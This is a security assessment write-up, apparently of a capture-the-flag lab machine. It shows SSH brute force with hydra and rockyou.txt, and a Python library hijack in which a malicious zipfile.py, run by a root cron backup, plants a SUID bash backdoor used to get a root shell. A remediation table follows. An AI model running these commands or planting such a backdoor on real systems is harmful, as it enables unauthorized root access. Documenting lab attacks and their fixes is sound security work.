# Security Assessment Report: Full Chain Compromise

| Field | Details |
|---|---|
| **Target IP** | 10.128.175.137 |
| **Attack Vector** | Brute Force → Local Reconnaissance → Privilege Escalation |
| **Date** | May 7, 2026 |
| **Severity** | 🔴 Critical |

---

## 1. Executive Summary

This report details the successful compromise of the target system. The attack progressed from external reconnaissance of the web server to an SSH Brute Force attack facilitated by information leakage in the `robots.txt` file. Once local access was established, a misconfiguration in an automated Python backup script allowed for a **Python Library Hijacking** attack, resulting in full administrative (root) access.

---

## 2. Phase 1: Reconnaissance & Initial Access

### 2.1 Information Leakage (`robots.txt`)

A manual inspection of the web server's hidden directories revealed a `robots.txt` file. This file contained a specific reference to `rockyou`, a well-known wordlist used in credential cracking.

**Discovery:**

```
http://10.128.175.137/robots.txt
→ Content: Disallow: /hint/rockyou.txt
```

### 2.2 SSH Brute Force Attack

Using the hint provided, an SSH brute force attack was conducted against the user `meliodas`. The `hydra` tool was employed using the `rockyou.txt` wordlist.

**Execution Command:**

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.128.175.137
```

**Result:** Successful login identified for user `meliodas`.

---

## 3. Phase 2: Local Enumeration

Upon establishing an SSH session, the environment was audited for misconfigurations. A Python script was discovered in the user's home directory that appeared to be managed by a system-wide process.

| Field | Value |
|---|---|
| **Script Identified** | `/home/meliodas/bak.py` |
| **Purpose** | Automated backup of `/var/www/html` to `/var/backups/website.zip` |

---

## 4. Phase 3: Privilege Escalation

### 4.1 Vulnerability: Python Path Hijacking

The script `bak.py` utilizes the statement `import zipfile`. Because the script is located in `/home/meliodas/`, and Python prioritizes the current working directory in its `sys.path`, we can intercept the import by creating a local file named `zipfile.py`.

### 4.2 Exploitation: SUID Backdoor Creation

The following malicious module was crafted to execute commands as root when the automated backup runs.

**Malicious Module (`/home/meliodas/zipfile.py`):**

```python
import os

# Create a persistent SUID backdoor
os.system("cp /bin/bash /home/meliodas/root_bash")
os.system("chown root:root /home/meliodas/root_bash")
os.system("chmod u+s /home/meliodas/root_bash")

# Necessary objects to prevent script failure
class ZipFile:
    def __init__(self, *args, **kwargs): pass
    def write(self, *args, **kwargs): pass
    def close(self): pass

ZIP_DEFLATED = 0
```

### 4.3 Root Access Acquisition

After the system's task scheduler (Cron) executed the backup, the SUID binary was triggered to obtain a root shell.

**Commands:**

```bash
# Execute the hijacked bash shell
/home/meliodas/root_bash -p

# Proof of System Authority
whoami && cat /root/root.txt
```

---

## 5. Remediation Strategy

| # | Finding | Remediation |
|---|---|---|
| 1 | **Information Disclosure** | Remove sensitive hints (like wordlist names) from public-facing files like `robots.txt`. |
| 2 | **Brute Force Mitigation** | Implement `Fail2Ban` or SSH key-only authentication to prevent automated password attacks. |
| 3 | **Secure Scripting** | Relocate administrative scripts to directories with restricted write access (e.g., `/usr/local/bin`). |
| 4 | **Python Security** | Run sensitive Python scripts with the `-I` flag to ignore the current directory in the module search path. |

---

*Report generated: May 7, 2026*
